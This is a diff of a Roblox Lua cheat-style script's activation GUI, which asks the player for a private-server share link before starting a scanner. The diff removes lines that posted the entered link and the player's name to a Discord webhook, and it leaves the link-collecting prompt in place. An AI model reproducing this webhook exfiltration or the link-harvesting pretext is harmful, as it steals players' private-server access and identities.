@@ -291,8 +291,8 @@ local function createActivationGUI()
 	statusLabel.Parent = mainFrame
 	
 	
-	-- Обработчики
-	activateButton.MouseButton1Click:Connect(function()
+	-- Функция активации
+	local function onActivate()
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1") -- trim
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
 			statusLabel.Text = "Invalid VIP link! Please enter a valid Roblox share link."
@@ -303,30 +303,28 @@ local function createActivationGUI()
 		statusLabel.Text = "Activating..."
 		statusLabel.TextColor3 = Color3.new(1, 1, 0)
 		
-		-- Отправляем VIP ссылку в Discord
-		sendWebhook({ 
-			content = string.format("VIP Link activated: %s\nUser: %s", vipLink, player.Name)
-		})
-		
 		-- Активируем скрипт
 		isActivated = true
 		statusLabel.Text = "Script activated successfully!"
 		statusLabel.TextColor3 = Color3.new(0, 1, 0)
 		
 		-- Запускаем сканирование
-		task.wait(1)
+		wait(1)
 		startBrainrotScanner()
 		
 		-- Убираем GUI через 2 секунды
-		task.wait(2)
+		wait(2)
 		gui:Destroy()
 		activationGUI = nil
-	end)
+	end
+	
+	-- Обработчики
+	activateButton.MouseButton1Click:Connect(onActivate)
 	
 	-- Enter для активации
 	textBox.FocusLost:Connect(function(enterPressed)
 		if enterPressed then
-			activateButton.MouseButton1Click:Fire()
+			onActivate()
 		end
 	end)
 	
@@ -509,7 +507,7 @@ local batchScheduled = false
 local function scheduleBatch()
 	if batchScheduled then return end
 	batchScheduled = true
-	local delayFn = (typeof(task) == "table" and task.delay) and task.delay or function(sec, fn)
+	local delayFn = function(sec, fn)
 		spawn(function()
 			wait(sec)
 			fn()
